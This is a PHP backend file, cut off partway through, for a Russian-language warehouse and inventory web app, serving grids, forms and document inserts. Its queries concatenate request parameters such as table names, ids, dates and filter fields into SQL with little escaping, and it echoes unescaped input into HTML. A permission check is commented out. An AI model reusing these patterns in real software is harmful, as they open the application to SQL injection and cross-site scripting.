<?php
session_start();

include('../check.php');
include('../errors.php');
checksessionpassword();
include( '../mysql.php' );
include('../tables.php');
include('../functions.php');
//include('functions.php');
include('../editor.php');


error_reporting(E_ALL ^ E_NOTICE);

include('../templates.php');
if ( isset( $_SESSION['timezone'] ) ){ 
    date_default_timezone_set( $_SESSION['timezone'] ); 
    mysql_query( "SET `time_zone` = '".date('P')."'" ); 
}

$page = isset( $_POST['page'] ) ? intval( $_POST['page'] ) : 1;  
$rowcount = isset( $_POST['rows'] ) ? intval( $_POST['rows'] ) : 10; 
$offset = ( $page - 1 ) * $rowcount;
            
if ( isset( $_GET['do'] ) )
    switch( $_GET['do'] ){
        //получение списка элементов в таблицы при открытие таблицы        
        
        case 'zreset_inventory':
            $q=mysql_query("SELECT * FROM t_inventory WHERE documentid='".intval($_GET['zdocid'])."'");
            if (mysql_numrows()){
                while($row=mysql_fetch_assoc($q)){
                    $query = mysql_query("SELECT i.id, NULL AS idout, NULL AS idlink, 0 AS parentid, 0 AS isgroup, NULL AS dt, NULL AS documentid, r.itemid, 
                            SUM(r.quantity) AS plannedquantity, ".$quantity." AS quantity, i.measurement AS measureid, 1.000 AS multip, c.costprice AS price, 1 AS editable
                        FROM r_remainder AS r
                        LEFT JOIN s_items AS i ON i.id = r.itemid
                        LEFT JOIN ( SELECT warehouseid, itemid, SUM(costsum) / SUM(quantity) AS costprice
                        FROM r_remainder GROUP BY warehouseid, itemid
                        ) AS c ON c.itemid = r.itemid AND c.warehouseid=".$warehouse."
                        WHERE r.warehouseid=".$warehouse."
                        GROUP BY r.warehouseid, r.itemid
                        ORDER BY id " 
                        .( isset( $_GET['nolimit'] ) ? '' : " LIMIT ".$offset.", ".$rowcount) ); 
                }
            }
        break;
        case 'get':
            $op=1;
        //print_R($_GET);
        //print_R($_POST);
        
            $res = array();

            $table = isset( $_GET['table'] ) ?  $_GET['table'] : '';
            $id = isset( $_GET['id'] ) ? intval( $_GET['id'] ) : 0;
            $parentid = isset($_POST['id']) ? intval($_POST['id']) : 0; 
            $idfield = isset( $_GET['idfield'] ) ? $_GET['idfield'] : '';
            $iddoc = isset( $_GET[$idfield] ) ? intval( $_GET[$idfield] ) : 0;
            $basedoc = isset( $_GET['basedoc'] ) ? $_GET['basedoc'] : '';
            $remains = isset( $_GET['remains'] ) ? intval( $_GET['remains'] ) : -1;
            $warehouse = isset( $_GET['warehouse'] ) ? intval( $_GET['warehouse'] ) : 1;
            $dt=isset( $_GET['dt'] ) ? $_GET['dt'] : '';
            //ppc
            if (($remains==1) && ($table=='t_inventory') && isset($_GET['zdocid'])){
                mysql_query("DELETE FROM t_inventory WHERE documentid='".intval($_GET['zdocid'])."'");
            }
            //ppc
            
            
            if( (isset($_GET['zreset'])) && ($_GET['zreset']==1) ){
                
                
                $t_inv=mysql_query("SELECT id,itemid FROM t_inventory WHERE documentid='".intval($_GET['documentid'])."'");
                
                $items_list=array(); 
                $items_list2=array(); 
                while($t_row=mysql_fetch_assoc($t_inv)){
                    $items_list[$t_row['id']]=$t_row['itemid']; 
                    $items_list2[]=$t_row['itemid'];     
                }

                
                
                $tq = mysql_query("SELECT r.itemid, 
                        SUM(r.quantity) AS plannedquantity, SUM(r.quantity) AS quantity,  c.costprice AS price
                    FROM r_remainder AS r
                    LEFT JOIN ( SELECT warehouseid, itemid, SUM(costsum) / SUM(quantity) AS costprice
                    FROM r_remainder GROUP BY warehouseid, itemid
                    ) AS c ON c.itemid = r.itemid AND c.warehouseid=".$warehouse."
                    WHERE r.warehouseid=".$warehouse." AND
                    r.itemid IN (".join(',',$items_list2).") AND r.dt<'".date('Y.m.d H:i:s',strtotime($dt))."'
                    GROUP BY r.warehouseid, r.itemid
                    ORDER BY r.itemid ");
                    
               
                    
               $mmm=array(); 
                while($tg_row=mysql_fetch_assoc($tq)){
                    $mmm[$tg_row['itemid']]=array('plannedquantity'=>$tg_row['plannedquantity'],'price'=>$tg_row['price']);
                }
                
                foreach($items_list as $zk=>$zv){
                    mysql_query("UPDATE t_inventory SET plannedquantity='".$mmm[$zv]['plannedquantity']."',price='".$mmm[$zv]['price']."' WHERE id='".$zk."'");
                   
            }


                
                $op=0;
            }
            
            
            $filter=array();
            if ( !empty( $_POST['filter'] ) && $_POST['filter'] != null ){
                foreach( $_POST['filter'] as $v ){
                    if ( $v['value'] != '' ){
                        if ( is_numeric( $v['value'] ) )
                            $filter[] = '`'.$v['name'].'`="'.addslashes( $v['value'] ).'"';
                        else
                            $filter[] = 'UPPER(`'.$v['name'].'`) LIKE UPPER("%'.addslashes( $v['value'] ).'%")';
                    }
                }
            }
            
            $wherestr = '';
            if ( substr( $table, 0, 2 ) == 't_' ){
                $wherestr = " WHERE ".addslashes( $idfield )."=".addslashes( $iddoc );
            } else if ( $id > 0 ) {
                $wherestr = " WHERE id=".addslashes( $id );
            } else if ( isset( $_SESSION['idap'] ) && $remains == -1 ){
                $result = mysql_query( 'SELECT warehouseid FROM s_automated_point WHERE id='.$_SESSION['idap'] );
                $row = mysql_fetch_row( $result );
                $wherestr = " WHERE warehouseid=".$row[0];
            }
            if ( $wherestr == '' ) $wherestr = ( !empty( $filter ) ? " WHERE ".join( ' AND ', $filter ) : '' );
            else $wherestr .= ( !empty( $filter ) ? ' AND '.join( ' AND ', $filter ) : '' );
                
            if ( $remains > -1 ){
                $quantity = $remains == 0 ? '0' : 'SUM(r.quantity)';

                $querytr = mysql_query( "SELECT itemid FROM r_remainder WHERE warehouseid=".$warehouse." GROUP BY itemid" );
                $totalrows = mysql_numrows( $querytr );
                
                $query = mysql_query(
"SELECT i.id, NULL AS idout, NULL AS idlink, 0 AS parentid, 0 AS isgroup, NULL AS dt, NULL AS documentid, r.itemid, 
    SUM(r.quantity) AS plannedquantity, ".$quantity." AS quantity, i.measurement AS measureid, 1.000 AS multip, c.costprice AS price, 1 AS editable
FROM r_remainder AS r
LEFT JOIN s_items AS i ON i.id = r.itemid
LEFT JOIN ( SELECT warehouseid, itemid, SUM(costsum) / SUM(quantity) AS costprice
FROM r_remainder GROUP BY warehouseid, itemid
) AS c ON c.itemid = r.itemid AND c.warehouseid=".$warehouse."
WHERE r.warehouseid=".$warehouse." AND r.dt<'".date('Y.m.d H:i:s',strtotime($dt))."'
GROUP BY r.warehouseid, r.itemid
ORDER BY id " 
.( isset( $_GET['nolimit'] ) ? '' : " LIMIT ".$offset.", ".$rowcount) );
                    
            } else {
                $op=0;
                $tablename = $table;
                if ( $basedoc != '' ){
                    if ( $basedoc == 't_inventory' ){
                        if ( $table == 't_posting' ){
                            $wherestr .= ' AND plannedquantity < quantity';
                        } else if ( $table == 't_cancellation' ){
                            $wherestr .= ' AND plannedquantity > quantity';
                        }
                    }
                    $tablename = $basedoc;
                }

                $editable = ', 1 AS editable';
                if ( isset( $_SESSION['idap'] ) && substr( $table, 0, 2 ) == 'd_' )
                    $editable = ', DATE(dt)=DATE(NOW()) AS editable';

                $querytr = mysql_query("SELECT id FROM `".addslashes( $tablename )."` ".$wherestr);
//echo "SELECT id FROM `".addslashes( $tablename )."` ".$wherestr;
                $totalrows = mysql_numrows( $querytr );

                $query = mysql_query( "SELECT *".$editable." FROM `".addslashes( $tablename )."` ".$wherestr
.( substr( $tablename, 0, 2 ) == 'd_' ? ' ORDER BY dt ' : '' )
.( isset( $_GET['nolimit'] ) ? '' : " LIMIT ".$offset.", ".$rowcount ) );
            
            }
            
            $i = 0;     
            while( $row = mysql_fetch_array( $query ) ){
                $a = array();
                    
                foreach( $fields[$table] as $k => $v ){
                    if ( ( $row['isgroup'] == 1 )&&( $v['in_group'] == 1 )||( $row['isgroup'] == 0 ) ){
                        switch($v['type']){
                            case 'label':
                                if ( $remains == -1 && $basedoc == '' )
                                    $a[$k] = get_select_val( $v['db_select'], $row[$k] );
                                else{
                                    $a['temp_'.$k] = $_SESSION['userid'];
                                    $a[$k] = $_SESSION['user'];
                                }
                            break;
                            case 'sum':
                                $a[$k] = get_db_select_sum( $fields[$table][$k]['db_select'], $fields[$table][$k]['idfield'], $row["id"], $fields[$table][$k]['sumfield'], ( $fields[$table][$k]['precision'] ? $fields[$table][$k]['precision'] : 2 ) );
                            break;
                            case 'rowsum':
                                if ( $table == 't_calculations' ){
                                    if ( $k == 'loss_cold_quantity' )
                                        $a[$k] = round( $row["quantity"] - $row["quantity"] * $row["loss_cold"] / 100, ( $fields[$table][$k]['precision'] ? $fields[$table][$k]['precision'] : 3 ) );
                                    else
                                        $a[$k] = round( $row["quantity"] - $row["quantity"] * $row["loss_hot"] / 100, ( $fields[$table][$k]['precision'] ? $fields[$table][$k]['precision'] : 3 ) );
                                } else if ( $k == 'totalplanned' )
                                    $a[$k] = round( $row["plannedquantity"] * $row["price"] * $row["multip"], ( $fields[$table][$k]['precision'] ? $fields[$table][$k]['precision'] : 2 ) );
                                else
                                    $a[$k] = round( $row["quantity"] * $row["price"] * $row["multip"], ( $fields[$table][$k]['precision'] ? $fields[$table][$k]['precision'] : 2 ) );
                            break;
                            case 'diff':
                                $a[$k] = round( $row["quantity"] - $row["plannedquantity"], ( $fields[$table][$k]['precision'] ? $fields[$table][$k]['precision'] : 3 ) );
                            break;
                            case 'date':
                                $a[$k] = date( 'd.m.Y', strtotime( $row[$k] ) );
                            break;
                            case 'datetime':
                                $a[$k] = date( 'd.m.Y H:i:s', strtotime( $row[$k] ) );
                            break;
                            case 'input':
                                if ( isset( $fields[$table][$k]['precision'] ) )
                                    $a[$k] = round( $row[$k], $fields[$table][$k]['precision'] );
                                else
                                    $a[$k] = $row[$k];
                            break;
                            case 'password':
                                $a[$k] = '';
                            break;
                            case 'db_select':
                            case 'db_groupselect':
                                if ( $k == 'documentid' || $k == 'calculationid' ){
                                    $a[$k] = $row[$k];
//                                } else if ( $remains == -1 && $basedoc == '' ){
//                                    $a['temp_'.$k] = $row[$k];
//                                    $a[$k] = get_select_val( $v['db_select'], $row[$k] );
                                } else { 
                                    $a['temp_'.$k] = $row[$k];
                                    $a[$k] = get_select_val( $v['db_select'], $row[$k] );
                                }
                            break;
                            case 'db_multiselect':
                                $a[$k] = get_multiselect_val( $v['db_select'], $row[$k] );
                            break; 
                            case 'checkbox':
                                $a[$k] = ( $row[$k] == 1 ? 'Да' : 'Нет' );
                            break;  
                            case 'db_grid':
                                $a[$k] = get_grid( $v['db_grid'], $row[$k], $v['idfield'] );
                            break; 
                            case 'timezone':
                                $a[$k]=getTimeZoneValue($row[$k]);
                            break;
                        }
                    }

                    if ( ( $remains > -1 || $basedoc != '' ) && ( $k == 'idout' || $k == 'idlink' || $k == 'dt' || $k == 'documentid' || $k == 'parentid' ) )
                        $a[$k] = null;
                    if ( !empty( $v['after_text'] ) ){
                       $a[$k].= $v['after_text']; 
                    }

                    $a['id'] = $basedoc != '' ? time() - $i : $row['id'] ;
                    $i--;
                    //1 - надо добавить
                    //2 - надо апдейт
                    //0 - ниче не надо
                    
                    $a['op'] = $op;

                    if ( !empty( $v['after_text'] ) ){
                       $a[$k] .= $v['after_text']; 
                    }
                }

                if ( !empty( $a['price'] ) ){
                    $a['price'] = round( $a['price'], 2 );
                    if ( $row['isgroup'] ) $a['price'] = ''; 
                }

                $a['isgroup'] = $row['isgroup'];
                $a['parentid'] = $row['parentid'];
                $a['editable'] = $row['editable'];
                
                if ( $basedoc != '' ){
                    
                    if ( $basedoc == 't_inventory' ){
                        if ( $table == 't_posting' ){
                            $a['quantity'] = $row['quantity'] - $row['plannedquantity'];
                        } else if ( $table == 't_cancellation' ){
                            $a['quantity'] = $row['plannedquantity'] - $row['quantity'];
                        }
                        unset( $a['plannedquantity'] );
                    }
                }
                
                $res[] = $a;
            }
            
            $answer = array();
            $answer["totalrows"] = $totalrows;
            $answer["rows"] = $res;
            echo json_encode( $answer );
        break;
        //получение списка отображаемых столбцов таблицы
        case 'gettableazorchik': 
            $tablename = isset( $_POST['table'] ) ? ( $_POST['table'] ) : ''; 
            $res = array();
            $res['name'] = $tablename;
            $res['title'] = $tables[$tablename]['name'];
            $res['create_group'] = $tables[$tablename]['create_group'];
            $res['width'] = $tables[$tablename]['width'];
            $res['height'] = $tables[$tablename]['height'];
            $res['rights'] = array( 'view' => true, 'edit' => true, 'add' => true, 'delete' => true, 'print' => true );

            $res['filter'] = getfilterfields( $tablename );

            foreach( $fields[$tablename] as $k => $v ){
                if ( $v['in_grid'] ){
                    $f = array();
                    $f['name'] = $k;
                    foreach( $v as $key => $value ){
                        if ( $key != 'width' ) $f[$key] = $value;
                    }
                    $res['fields'][] = $f;
                }
            }

            echo json_encode( $res );
        break;
        
        //получение коэф-та для выбр. ед. изм. на основании баз. ед. изм.
        case 'getMultip':
            $iId = isset( $_POST['itemid'] ) ? intval( $_POST['itemid'] ) : 0;
            $mId = isset( $_POST['measureid'] ) ? intval( $_POST['measureid'] ) : 0;
            
            if ( $iId > 0 && $mId > 0 ){
                if ( $result = mysql_query( 'SELECT m.multip FROM s_multipliers AS m
LEFT JOIN s_items AS i ON i.measurement = m.tomeasureid
WHERE i.id = '.$iId.' AND m.frommeasureid = '.$mId ) ){
                    
                    if ( $row = mysql_fetch_row( $result ) )
                        echo $row[0];
                    else
                        echo '1.000';
                    
                } else echo '1.000';
                
            } else echo '1.000';
        break;
        
        //получение баз. ед. изм. для товара
        case 'getMeasure':
            $iId = isset( $_POST['itemid'] ) ? intval( $_POST['itemid'] ) : 0;
            $answer = array();
            
            if ( $iId > 0 ){
                if ( $result = mysql_query( 'SELECT m.id, m.name FROM s_items
LEFT JOIN s_units_of_measurement AS m ON m.id = s_items.measurement 
WHERE s_items.id = '.$iId ) ){
                    if ( $row = mysql_fetch_row( $result ) ){
                        $answer['id'] = $row[0];
                        $answer['name'] = $row[1];
                    }
                }
            }
            
            echo json_encode( $answer );
        break;
        
        //получение складов активной торговой точки
        case 'getselectA':
            $options = '';
            if ( isset( $_POST['table'] ) ){
                $table = addslashes( $_POST['table'] );
                $query = '';
                $options = '';
                $selected = ' selected="selected"';
                
                switch ( $table ){
                    case 's_warehouse':
                        if ( isset( $_SESSION['idap'] ) )
                            $query = 'SELECT w.`id`, w.`name` FROM `s_automated_point` AS ap LEFT JOIN `s_warehouse` AS w ON w.`id`=ap.`warehouseid` WHERE ap.`id`='.$_SESSION['idap'];
                        else
                            $query = 'SELECT `id`, `name` FROM `s_warehouse` ORDER BY `name`';
                
                        if ( !isset( $_SESSION['idap'] ) )
                            $options = '<option value="0" >Корень</option>';
                    break;
                    case 'd_changes':
                        $query = "SELECT c.id, CONCAT(e.name,' ', DATE_FORMAT(c.dtopen, '%d.%m.%Y %H:%i:%s'),' - ',IF(ISNULL(c.dtclosed), '',DATE_FORMAT(c.dtclosed, '%d.%m.%Y %H:%i:%s'))) AS name
FROM d_changes AS c LEFT JOIN s_employee AS e ON e.id=c.employeeid".( isset( $_SESSION['idap'] ) ? " WHERE c.idautomated_point=".$_SESSION['idap'] : "" )." ORDER BY c.dtopen DESC";
                    break;
                }
                
                if ( !isset( $_SESSION['idap'] ) ) $selected = '';
                
               
                
                
                if ( $result = mysql_query( $query ) ){
                     if(mysql_numrows($result)==1) $selected=' selected';
                    
                    while ( $row = mysql_fetch_array( $result ) ){
                        $options .= '<option value="'.$row['id'].'"'.$selected.'>'.$row['name'].'</option>';
                    }
                }
                else
                    $options = '<option value="-1" selected="selected">'.$query.'</option>';

            }
            echo $options;
        break;
        
        //просмотр элемента и печать
        case 'view_el': 
            $result = array();

            $tablename = isset( $_GET['table'] ) ? $_GET['table'] : '';
            $id = isset( $_GET['id'] ) ? $_GET['id'] : '';

            $result[] = '<div class="modal fade"  id="dialog_view-'.$tablename.'"  tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
<div class="modal-dialog" style="width:900px" >
<div class="modal-content">
<div class="modal-header">
    '.( isset( $_GET['print'] ) ? '' : '<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>' ).'
    <h4 class="modal-title">Просмотр документа '.$tables[$tablename]['name'].'</h4>
</div><div class="modal-body">
<div class="formp">';

            $query = mysql_query( "SELECT * FROM `".addslashes( $tablename )."` WHERE id='".$id."' LIMIT 1" );
            $row = mysql_fetch_assoc( $query );
            foreach( $fields[$tablename] as $k => $v ){
                if ( $v['in_edit'] ){
                    $result[] = '<div class="fitem"><label>'.$v['title'].( !empty( $v['alt'] ) ? ' (<a href="#" class="easyui-tooltip" title="'.$v['alt'].'">i</a>)' : '' ).':</label>';

                    switch ($v['type']){
                        case 'sum':
                            $result[] = get_db_select_sum( $fields[$tablename][$k]['db_select'], $fields[$tablename][$k]['idfield'], $id, $fields[$tablename][$k]['sumfield'], 2 );
                        break;
                        case 'label':
                            $result[] = get_db_select_value( $v['db_select'], $row[$k] );
                        break;
                        case 'input': 
                            $result[] = $row[$k];
                        break;
                        case 'checkbox': 
                            $result[] = ( $row[$k] == 1 ? 'Да' : 'Нет' );
                        break;
                        case 'db_select':
                            $result[] = get_db_select_value( $v['db_select'], $row[$k] );
                        break;
                        case 'timezone':
                            $result[] = getTimeZoneValue( $row[$k] );
                        break;
                        case 'db_grid':
                            if ( isset( $_GET['print'] ) ){
                                
                                $result[] = "<table style='border-spacing: 0; border-collapse: separate; border: 1px groove #000' id='tableview-".$k."1'>";
                                
                                $trtb = '<thead><tr>';
                                foreach( $fields[$k] as $k1 => $v1 ){
                                    if ( $v1['in_grid'] ){
                                        $trtb .= "<td style='border: 1px solid #000'>".$v1['title']."</td>";
                                    }
                                }
                                $trtb .= '</tr></thead>';
                                $result[] = $trtb;
                                
                                if ( $k == 't_calculations' )
                                    $querytb = mysql_query( "SELECT * FROM `".$k."` WHERE calculationid=".$id );
                                else
                                    $querytb = mysql_query( "SELECT * FROM `".$k."` WHERE documentid=".$id );
                                
                                while ( $rowtb = mysql_fetch_array( $querytb ) ){
                                    $trtb = '<tr>';
                                    foreach( $fields[$k] as $k1 => $v1 ){
                                        if ( $v1['in_grid'] ){
                                            $trtb .= "<td style='border: 1px groove #000'>".$rowtb[$k1]."</td>";
                                        }
                                    }
                                    $trtb .= '</tr>';
                                    $result[] = $trtb;
                                }
                                
                                $result[] = "</table>";
                            } else {
                                $result[] = "<div style='max-height: 400px; overflow: auto;'><table id='tableview-".$k."'></table></div>
<script> 
\$('#tableview-".$k."').myTreeView({  
    url:'/company/warehouse/warehouse.php?do=get&table=".$k."&idfield=".$fields[$tablename][$k]['idfield']."&".$fields[$tablename][$k]['idfield']."=".$id."&nolimit=topgear',
    headers: [";
    foreach( $fields[$k] as $k1 => $v1 ){
        if ( $v1['in_grid']){
            $result[]= "{name:'".$k1."',title:'".$v1['title']."'".( !empty( $v1['width'] ) ? ",width:'".$v1['width']."'" : '' )."},";
        } 
    }
    $result[] = "],
    tree: false,
    pagination: false
});
</script>";
                            }
                        break;
                    }
                    if ( !empty( $v['after_text'] ) ) $result[] = $v['after_text'];

                    $result[] = '</div>';
                }
            }

            $result[] = '</div>';
            if ( !isset( $_GET['print'] ) ){ 
                $result[] = '<div class="modal-footer"><button type="button" class="btn btn-default" data-dismiss="modal">Закрыть</button>';
                $result[] = '<a href="/company/warehouse/warehouse.php?do=printDocument&table='.$tablename.'&id='.$id.'&print=1" target="_blank" class="btn btn-primary" iconCls="icon-print">Печать</a>';
                $result[] = '</div>';
            }
            $result[] = '</div></div> </div>';

            if ( !isset( $_GET['print'] ) ){
                echo join( '', $result );
            } else {
                echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Печать</title>
<script type="text/javascript" src="/company/js/jquery-1.8.0.min.js"></script>
<script>$(document).ready(function() {
window.print();
setTimeout(function (){ window.close(); }, 200 ); });</script>
</head>
<body>'.join( '', $result ).'</body></html>';
            }
        break;
        //создание элемента
        case 'create_el':
            $tablename = isset( $_GET['table'] ) ? $_GET['table'] : '';
            $parentid = isset( $_GET['parentid'] ) ? $_GET['parentid'] : 0;

            echo '<div class="modal fade"  id="dialog_add-'.$tablename.'"  tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" style="width:900px" >
<div class="modal-content">
<div class="modal-header">
    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
    <h4 class="modal-title">Добавление '.( substr( $tablename, 0, 2 ) == 'd_' ? 'документа ' : 'элемента ' ).$tables[$tablename]['name'].'</h4></div><div class="modal-body">
<div class="formp">
<form class="form-horizontal" role="form" id="form_add-'.$tablename.'" method="post" action="/company/warehouse/warehouse.php?do=add&table='.$tablename.'&parentid='.$parentid.'"  novalidate>';      
            
            if ( isset( $editor[$tablename] ) ){
                echo form_design( $tablename, 0, 0 );
            } else {
                foreach( $fields[$tablename] as $k => $v ){
                    if ( $v['in_edit'] ){//$v['type'] != 'db_grid' && 
                        echo showfieldA( $tablename, $k, 0, 0 ); 

                        if ( substr( $tablename, 0, 7 ) != 'd_cash_' && $v['type'] == 'db_select' && ( $k === 'measureid' || $k === 'itemid' || $k === 'srcitemid' || $k === 'destitemid' ) ){
                            if ( $k === 'itemid' || $k === 'srcitemid' || $k === 'destitemid' )
                                echo '<script>
$( "#form_add-'.$tablename.' input[name='.$k.']" ).die( "change" );
$( "#form_add-'.$tablename.' input[name='.$k.']" ).live( "change", function (){ getMeasure( this ); } );
</script>';
                            else if ( $tablename != 's_calculations' )
                                echo '<script>
$( "#form_add-'.$tablename.' input[name='.$k.']" ).die( "change" );
$( "#form_add-'.$tablename.' input[name='.$k.']" ).live( "change", function (){ getMultip( this ); } );
</script>';
                        }
                                
                        if ( $tablename == 't_calculations' && ( $k === 'loss_cold' || $k === 'loss_hot' || $k === 'quantity' ) ){
                            echo '<script>
$( "#form_add-'.$tablename.' input[name='.$k.']" ).die( "change" );
$( "#form_add-'.$tablename.' input[name='.$k.']" ).live( "change", function (){ calcLoss( this ); } );
</script>';
                        }
                    }
                }
            }
            
            if ( substr( $tablename, 0, 2 ) != 't_' ){
                echo '<input type="hidden" name="saved" value="0">
<input type="hidden" name="conduct" value="0">'
.( substr( $tablename, 0, 7 ) == 'd_cash_' ? '' : '<input type="hidden" name="t_'.( substr( $tablename, 2 ) ).'" value="">' );
            }
            if ( isset( $_GET['documentid'] ) )
                echo '<input type="hidden" name="'.( $tablename == 't_calculations' ? 'calculationid' : 'documentid' ).'" value="'.$_GET['documentid'].'">';
            
            $actionBtns = '';
            $tipaConductAll='';
            if ( $tablename == 'd_inventory' ){
                $tipaConductAll =  '<button type="button" class="btn btn-default" onclick="ZConductInventoy(this, \''.$tablename.'\',\''.$id.'\')">Создать оприходование и списание и провести</button>';
                $actionBtns = '<div class="btn-group dropup">
<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">Заполнить<span class="caret"></span></button>
<ul class="dropdown-menu" role="menu">
<li><a href="#" onclick="getRemains(\''.$tablename.'\', 1)">По остаткам</a></li>
<li><a href="#" onclick="getReRemains(\''.$tablename.'\')">Перезаполнить учетные количества</a></li>
</ul></div>';
            }
            
            $conductBtn = '';
            if ( substr( $tablename, 0, 2 ) == 'd_' && $tablename != 'd_inventory' && $tablename != 'd_request' ){
                $conductBtn = '<button type="button" class="btn btn-primary" onclick="conductA(this, \''.$tablename.'\',\''.$id.'\')">Провести</button>';
            }

            echo '<input type="hidden" name="isgroup" value="0"></form></div></div><div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Отмена</button> '
.$actionBtns.' '
.$conductBtn
.$tipaConductAll
.' <button type="button" class="btn btn-primary" onclick="saveA(this, \''.$tablename.'\',0)">Добавить</button>
</div></div></div></div>';
        break;
        //добавление группы и элемента в базу
        case 'add':
            //if ( !checkrights( $_GET['table'], 3 ) ) die( PERMISSION_DENIED );
            if ( isset( $_SESSION['last_ins'] ) && ( time() - $_SESSION['last_ins'] < 3) ){
                echo 'Dublicate!';
            } else {
                $tablename =  isset($_GET['table']) ? $_GET['table'] : '';
                $parentid = isset($_GET['parentid']) ? $_GET['parentid'] : '0';
                $documentid = isset($_POST['documentid']) ? intval( $_POST['documentid'] ) : 0;
                
                $arr = array();

                $_POST['idout'] = getLastIdout( $tablename );
                
                if ( substr( $tablename, 0, 2 ) == 't_' /*&& $documentid == 0*/ ){
                    //ВЕРНУТЬ МАССИВ ПОЛЕЙ
                    $arr = $_POST;
                    
                    $query = mysql_query( "SHOW COLUMNS FROM `".addslashes( $tablename )."`" );
                    while ( $row = mysql_fetch_assoc( $query ) ){
                        $arr[$row['Field']] = isset( $_POST[$row['Field']] ) ? $_POST[$row['Field']] : null;
                    }
                    
                    foreach( $arr as $k => $v ){
                        if ( !empty( $fields[$tablename][$k]['type'] ) )
                            switch ( $fields[$tablename][$k]['type'] ){
                                case 'label':
                                    $arr[$k] = get_select_val( $fields[$tablename][$k]['db_select'], $v );
                                break;
                                case 'db_select':
                                    if ( $k == 'documentid' || $k == 'calculationid' ){
                                        $arr[$k] = $arr[$k];
                                    } else {
                                        $arr['temp_'.$k] = $arr[$k];
                                        $arr[$k] = get_select_val( $fields[$tablename][$k]['db_select'], $v );
                                    }
                                break; 
                                case 'db_grid':
                                    $arr[$k] = get_grid( $fields[$tablename][$k]['db_grid'], $v );
                                break;
                                case 'checkbox':
                                    $arr[$k] = ( $arr[$k] == 1 ? 'Да' : 'Нет' );
                                break;
                            }
                        if ( !empty( $fields[$tablename][$k]['after_text'] ) ){
                            $arr[$k] .= $fields[$tablename][$k]['after_text'];
                        }
                    }
                    
                    $answer = array();
                    
                    if ( substr( $tablename, 0, 2 ) == 't_' ){
                        $arr['id'] = time();
                        $arr['op'] = 1;//Добавили новую позицию
                    }
                    
                    if ( substr( $tablename, 2 ) != 'calculations' ){
                        if ( $tablename == 't_inventory' ){
                            $arr["diff"] = round( $arr["quantity"] - $arr["plannedquantity"], 3 );
                            $arr["totalplanned"] = round( $arr["plannedquantity"] * $arr["price"] * $arr["multip"], 2 );
                        }
                        $arr["total"] = round( $arr["quantity"] * $arr["price"] * $arr["multip"], 2 );

                        $answer["row"] = $arr;

                        $table = 'd_'.addslashes( substr( $tablename, 2 ) );
                        $answer["total"] = get_db_select_sum( $fields[$table]['total']['db_select'], $fields[$table]['total']['idfield'], ( int ) $arr['documentid'], $fields[$table]['total']['sumfield'], 2 );
                        if ( $tablename == 't_inventory' ){
                            $answer["totalplanned"] = get_db_select_sum( $fields[$table]['totalplanned']['db_select'], $fields[$table]['totalplanned']['idfield'], ( int ) $arr['documentid'], $fields[$table]['totalplanned']['sumfield'], 2 );
                            $answer["totaldiff"] = get_db_select_sum( $fields[$table]['totaldiff']['db_select'], $fields[$table]['totaldiff']['idfield'], ( int ) $arr['documentid'], $fields[$table]['totaldiff']['sumfield'], 3 );
                        }
                    } else {
                        if ( $tablename == 't_calculations' ){
                            $arr['loss_cold_quantity'] = round( $arr['quantity'] - $arr['quantity'] * $arr['loss_cold'] / 100, 3 );
                            $arr['loss_hot_quantity'] = round( ( $arr['quantity'] - $arr['quantity'] * $arr['loss_cold'] / 100 ) - $arr['quantity'] * $arr['loss_hot'] / 100, 3 );
                        }
                        
                        $answer["row"] = $arr;
                    }
                    
                    echo json_encode( $answer );
                    
                } else {
                    $td = array();
                    $deleted = array();
                    $ms = array();
                    $conduct = -1;
                    foreach ( $_POST as $k => $v ){
                        if ( $k != 'id' )                        
                            if ( $fields[$tablename][$k]['type'] == 'date' ){
                                $arr[] = addslashes( $k )."='".date('Y-m-d', strtotime( $v ) )."'";
                            } else if ( $fields[$tablename][$k]['type'] == 'datetime' ){
                                $arr[] = addslashes( $k )."='".date('Y-m-d H:i:s', strtotime( $v ) )."'";
                            } else if ( $fields[$tablename][$k]['type'] == 'db_grid' ){                        
                                $td = json_decode( $_POST[$k] );
                            } else if( $fields[$tablename][$k]['type'] == 'db_multicheckbox' ){
                                $ms[$k] = $_POST[$k];
                            } else if ( $k == 't_'.( substr( $tablename, 2 ) ).'_deleted' ){
                                if ( $_POST[$k] != '' )
                                    $deleted = split( ';', $_POST[$k] );
                            } else {
                                if ( $k == 'parentid' ){
                                    $parentid = ( int )$v;
                                } else if ( $k == 'conduct' ){
                                    $conduct = ( int )$v;
                                } else if ( $k == 'saved' || $k == 'editable' ){
                                } else {
                                    if ( isset( $fields[$tablename][$k]['numeric'] ) ){
                                        $v = strpos( $v, ',' ) > -1 ? str_replace( ',' , '.', $v ) : $v;
                                    }
                                    $arr[] = addslashes( $k )."='".addslashes( $v )."'";
                                }
                            }
                    }
                    
                    if ( $tablename == 's_calculations' && isset( $td ) ){
                        $s = '';
                        foreach( $td as $k => $v ){
                            if ( is_object( $v ) ) $v = get_object_vars( $v );
                            $s .= $v['temp_itemid'].',';
                        }
                        $s = substr( $s, 0, -1 );
                        
                        if ( checkCircles( $_POST['itemid'], $s ) == 0 ){
                            $answer = array();
                            $answer['rescode'] = 1;
                            $answer['resmsg'] = 'Сохранение невозможно, т.к. один или несколько ингредиентов используют выбранное блюдо!';
                            die( json_encode( $answer ) );
                        }
                    }
                    
                    mysql_query( "INSERT INTO `".addslashes( $tablename )."` SET parentid='".addslashes( $parentid )."', ".join( ',', $arr ) ) or die( mysql_error() );
                    $_SESSION['last_ins'] = time();

                    $last_id = mysql_insert_id();

                    if ( isset( $deleted ) && !empty( $deleted ) ){
                        $s = '0';
                        foreach( $deleted as $d ){
                            $s .= ','.$d;
                        }
                        mysql_query( 'DELETE FROM t_'.( substr( $tablename, 2 ) ).' WHERE id IN ('.$s.')' ) or die( mysql_error() );
                    }
                    
                    if ( isset( $td ) && !empty( $td ) ){
                        $qhdr = 'INSERT INTO t_'.( substr( $tablename, 2 ) ).' SET ';
                 
                        foreach( $td as $k => $v ){
                            $arr = array();
                            foreach( $v as $kitem => $item ){
                                if ( $kitem == 'documentid' )
                                    $arr[] = $kitem.'="'.$last_id.'"';
                                else if ( $kitem == 'calculationid' )
